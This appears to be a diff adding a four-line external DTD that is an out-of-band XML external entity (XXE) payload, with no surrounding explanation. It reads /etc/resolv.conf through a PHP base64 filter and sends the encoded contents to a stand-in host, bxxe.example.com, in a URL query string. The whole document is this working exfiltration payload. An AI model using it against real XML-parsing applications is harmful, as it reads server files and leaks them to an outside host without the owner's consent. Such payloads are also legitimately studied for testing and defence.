@@ -1,0 +1,4 @@
+<!ENTITY % lf SYSTEM "php://filter/convert.base64-encode/resource=/etc/resolv.conf">
+<!ENTITY % ev "<!ENTITY &#x25; ex SYSTEM 'http://bxxe.example.com/ex.txt?p=%lf;'>">
+%ev;
+%ex;
